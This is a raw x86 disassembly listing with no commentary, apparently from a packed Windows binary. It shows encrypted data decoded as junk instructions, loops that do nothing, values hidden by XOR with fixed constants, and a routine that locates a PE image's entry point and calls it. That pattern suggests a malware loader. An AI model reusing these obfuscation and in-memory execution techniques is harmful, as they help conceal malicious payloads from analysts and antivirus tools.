  40d6d1:	mov    ebp,0xe9efe62c
  40d6d6:	int    0xdc
  40d6d8:	push   DWORD PTR [edi+0x49a9bf7]
  40d6de:	mov    ecx,0x2793ec31
  40d6e3:	or     DWORD PTR [eax-0x1838fbae],esi
  40d6e9:	nop
  40d6ea:	(bad)  
  40d6ed:	ss push 0x64
  40d6f0:	jne    0x40d75b
  40d6f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6f3:	(bad)  [edx-0x33]
  40d6f6:	call   0xbab2a52b
  40d6fb:	pop    esi
  40d6fc:	dec    ebp
  40d6fd:	pushf  
  40d6fe:	int3   
  40d6ff:	pop    ecx
  40d700:	ret    0xad39
  40d703:	rol    DWORD PTR [ebx+0x51a7e780],1
  40d709:	xchg   ebx,eax
  40d70a:	into   
  40d70b:	cmp    DWORD PTR [esi+ebx*2],esp
  40d70e:	je     0x40d6f2
  40d710:	aam    0x29
  40d712:	leave  
  40d713:	adc    al,0x18
  40d715:	jl     0x40d6b5
  40d717:	mov    esi,0x122e8e80
  40d71c:	sub    eax,0x7acc55b3
  40d721:	cmp    al,0x36
  40d723:	out    dx,al
  40d724:	inc    ebx
  40d725:	fild   DWORD PTR [edi]
  40d727:	pop    edi
  40d728:	jbe    0x40d73b
  40d72a:	sti    
  40d72b:	push   0xffffffa8
  40d72d:	adc    BYTE PTR [edx],al
  40d72f:	call   DWORD PTR fs:[edx]
  40d732:	or     eax,0x88ec175a
  40d737:	(bad)  
  40d738:	(bad)  
  40d739:	shr    DWORD PTR [edx+0x4d],0xf2
  40d73d:	cld    
  40d73e:	mov    al,ds:0x2fc90642
  40d743:	imul   eax,DWORD PTR [esi+edi*2-0x27517a],0x2e1d9ddf
  40d74e:	cmp    esi,DWORD PTR [edi+0x0]
  40d751:	retf   0xc0ba
  40d754:	xor    edx,DWORD PTR [edi+0x17]
  40d757:	dec    ebx
  40d758:	data16 or BYTE PTR gs:[edx+0x4b],dh
  40d75d:	jge    0x40d75e
  40d75f:	loope  0x40d6f5
  40d761:	data16 mov ds:0xd758d380,al
  40d767:	add    eax,0xd73d402c
  40d76c:	(bad)  
  40d76d:	jecxz  0x40d7e6
  40d76f:	pop    ebx
  40d770:	sahf   
  40d771:	lods   eax,DWORD PTR ds:[esi]
  40d772:	push   edx
  40d773:	sahf   
  40d774:	adc    bl,bl
  40d776:	leave  
  40d777:	cwde   
  40d778:	inc    ebx
  40d779:	xchg   edx,eax
  40d77a:	jo     0x40d71a
  40d77c:	inc    esi
  40d77d:	cli    
  40d77e:	pop    ds
  40d77f:	fcomp  st(5)
  40d781:	and    BYTE PTR [esi],ch
  40d783:	xor    BYTE PTR [eax],ah
  40d785:	xor    al,0xe8
  40d787:	js     0x40d776
  40d789:	jge    0x40d794
  40d78b:	stos   DWORD PTR es:[edi],eax
  40d78c:	ret    0xbbcf
  40d78f:	dec    edx
  40d790:	add    BYTE PTR [ecx],bl
  40d792:	cmp    eax,DWORD PTR [ebx]
  40d794:	(bad)  
  40d795:	clc    
  40d796:	mov    DWORD PTR [ecx-0x5],esp
  40d799:	out    0xf1,eax
  40d79b:	in     al,dx
  40d79c:	stc    
  40d79d:	pusha  
  40d79e:	push   ss
  40d79f:	or     dl,dl
  40d7a1:	daa    
  40d7a2:	adc    edx,edi
  40d7a4:	xlat   BYTE PTR ds:[ebx]
  40d7a5:	fdiv   DWORD PTR [ecx]
  40d7a7:	jge    0x40d7c6
  40d7a9:	dec    ebx
  40d7aa:	les    ecx,FWORD PTR [ebp+edi*8-0x7b]
  40d7ae:	inc    eax
  40d7af:	rol    DWORD PTR [edi+ecx*1-0x72],0xbb
  40d7b4:	or     eax,0x71e46347
  40d7b9:	xor    esp,ebp
  40d7bb:	(bad)  
  40d7bd:	adc    al,0xfb
  40d7bf:	jle    0x40d81e
  40d7c1:	xor    DWORD PTR [edx],edi
  40d7c3:	fdiv   QWORD PTR [edi+0x4494efc6]
  40d7c9:	iret   
  40d7ca:	fcom   QWORD PTR [ebp+0x74ea96d6]
  40d7d0:	nop
  40d7d1:	fisubr DWORD PTR [ecx-0x1bb0237]
  40d7d7:	clc    
  40d7d8:	ror    BYTE PTR [ecx],cl
  40d7da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7db:	or     eax,0xd90ae4b8
  40d7e0:	cmp    BYTE PTR [edx],0x36
  40d7e3:	pop    ecx
  40d7e4:	test   BYTE PTR [edi],0x73
  40d7e7:	and    ah,BYTE PTR [edi+ebp*4+0x468ee512]
  40d7ee:	and    ebx,DWORD PTR [edi-0x72]
  40d7f1:	clc    
  40d7f2:	loop   0x40d804
  40d7f4:	mov    BYTE PTR [edi+edi*4],bl
  40d7f7:	pop    ds
  40d7f8:	sbb    DWORD PTR [eax+ecx*4-0x62c34fc5],edx
  40d7ff:	pop    ebp
  40d800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d801:	jmp    0x40d85e
  40d803:	scas   al,BYTE PTR es:[edi]
  40d804:	cmp    bh,cl
  40d806:	jge    0x40d7eb
  40d808:	cmp    al,0x49
  40d80a:	stos   DWORD PTR es:[edi],eax
  40d80b:	push   0xf71f6e51
  40d810:	ins    BYTE PTR es:[edi],dx
  40d811:	dec    eax
  40d812:	ins    DWORD PTR es:[edi],dx
  40d813:	int    0x1
  40d815:	dec    esi
  40d816:	cmp    eax,0xf84d6b82
  40d81b:	xchg   DWORD PTR [esi],edi
  40d81d:	jnp    0x40d844
  40d81f:	sub    WORD PTR [esi-0x41],ax
  40d823:	sbb    edx,ebp
  40d825:	adc    al,0xdf
  40d827:	and    al,0x65
  40d829:	pop    eax
  40d82a:	adc    esp,DWORD PTR cs:[ecx]
  40d82d:	int3   
  40d82e:	ins    BYTE PTR es:[edi],dx
  40d82f:	in     eax,0xb4
  40d831:	push   eax
  40d832:	xor    ch,0xee
  40d835:	dec    ecx
  40d836:	mov    ah,0xf4
  40d838:	daa    
  40d839:	addr16 popf 
  40d83b:	mov    ds:0xc663fd35,al
  40d840:	jno    0x40d817
  40d842:	(bad)  
  40d843:	in     al,0x67
  40d845:	in     al,0x76
  40d847:	bound  esi,QWORD PTR [edx+ebx*2+0x75f5f7b]
  40d84e:	(bad)  
  40d84f:	clc    
  40d850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d851:	jo     0x40d87b
  40d853:	jns    0x40d8ac
  40d855:	aam    0x1b
  40d857:	sti    
  40d858:	rol    BYTE PTR [edx+ebp*8-0x5283180a],cl
  40d85f:	(bad)  
  40d860:	and    ebx,esp
  40d862:	mov    ds:0x70b5c037,al
  40d867:	shr    ch,cl
  40d869:	inc    esp
  40d86a:	push   edx
  40d86b:	and    bl,BYTE PTR [ebp-0x63]
  40d86e:	mov    ebp,0x3666eab
  40d873:	jge    0x40d865
  40d875:	mov    edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fce9,0x42e11c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fd76,0x42fcf1
  40d8af:	call   DWORD PTR ds:0x42e497
  40d8b5:	and    DWORD PTR ds:0x42fcfd,0x42fd82
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e134,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e124,0x42fce9
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e50f
  40d8ee:	sbb    DWORD PTR ds:0x42e6fb,0x42fd72
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fcf5,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e457
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fd05,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fd76,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e124,0x42e6f7
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fd6e,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fced,0x42e118
  40d977:	call   DWORD PTR ds:0x42e49f
  40d97d:	mov    DWORD PTR ds:0x42e11c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e38f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fd01,0x42e134
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fced,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e2fb
  40d9be:	mov    DWORD PTR ds:0x42fd8a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e118,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fcf5,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fcf5
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fcf5,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fcf5,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e18d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e54f
  40da20:	cmp    DWORD PTR ds:0x42fcf5,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fcf5
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fcf5,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fcf5,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e703,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e6f3,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fcd1,0x42e11c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fd05,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fd05,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fd05,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e553
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fd05
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fd05,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e707,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e707,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e707,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e463
  40dae4:	cmp    DWORD PTR ds:0x42e707,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e707
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e707,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e707
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e707,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e6ff,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e6ff,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e6ff,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e557
  40db41:	cmp    DWORD PTR ds:0x42e6ff,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fd76,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fd76,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fd76,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e55b
  40db97:	cmp    DWORD PTR ds:0x42fd76,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e707,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e713,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fd7e,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fce5,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fce5
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fce5,edi
  40dc13:	cmp    DWORD PTR ds:0x42fce5,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fce5,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e467
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e128,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fd01,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fd09,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e6f7,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e6f7,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e46b
  40dcaa:	cmp    DWORD PTR ds:0x42e6f7,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fd82,0x42e12c
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fd82,0x42e124
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fcd1,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e118,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fd72,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fd72,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fd72,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e46f
  40dd4f:	cmp    DWORD PTR ds:0x42fd72,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fd0d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e130,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fd09,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fd86,0x42fcfd
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e6f3,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e6ff,0x42fd8a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e6eb
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fce5,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fce5
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fce5,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fce5,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fd09
  40de0d:	push   0x42e26d
  40de12:	call   DWORD PTR ds:0x42e473
  40de18:	cmp    DWORD PTR ds:0x42fce5,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fd21
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fcfd,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fcf5,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fcf5,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fcf5,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e55f
  40de65:	mov    edx,DWORD PTR ds:0x42fcf5
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fcf5,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fce9,0x42fcd5
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fce9
  40e10f:	jmp    0x40e279
